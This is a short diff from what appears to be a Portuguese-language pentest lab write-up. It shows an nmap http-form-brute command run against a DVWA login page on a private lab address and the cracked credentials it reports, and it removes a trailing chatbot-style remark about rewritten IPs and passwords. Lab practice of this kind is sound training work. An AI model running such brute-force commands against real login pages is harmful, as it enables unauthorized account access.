@@ -72,6 +72,3 @@ bash
 nmap 192.168.100.20 --script http-form-brute --script-args userdb=users.txt,passdb=passwords.txt,path=/dvwa/login.php -p 80
 Resultado: credenciais válidas admin1:secure123. Login confirmado na página DVWA.
 
-👉 Pronto! Agora o texto está reescrito com novos IPs (192.168.100.10 / 192.168.100.20) e novas senhas/usuários (pentester:pentestlab, `admin1
-
-
